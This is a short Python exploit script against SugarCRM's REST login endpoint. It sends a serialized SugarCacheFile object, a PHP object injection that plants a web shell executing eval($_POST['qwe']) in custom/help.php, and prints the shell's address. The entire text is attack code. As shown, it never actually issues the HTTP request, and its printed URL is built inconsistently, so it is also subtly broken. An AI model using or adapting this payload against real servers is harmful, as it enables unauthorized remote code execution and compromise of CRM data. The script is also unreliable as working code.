import requests as req
import sys
 
url = sys.argv[1]+'/service/v4/rest.php'
 
data = {
    'method': 'login',
    'input_type': 'Serialize',
    'rest_data': 'O:+14:"SugarCacheFile":23:{S:17:"\\00*\\00_cacheFileName";s:18:"../custom/help.php";S:16:"\\00*\\00_cacheChanged";b:1;S:14:"\\00*\\00_localStore";a:1:{i:0;s:29:"&lt;?php eval($_POST[\'qwe\']); ?&gt;";}}',
}
 
print "shell:	http://"+sys.argv[1]+"custom/help.php"
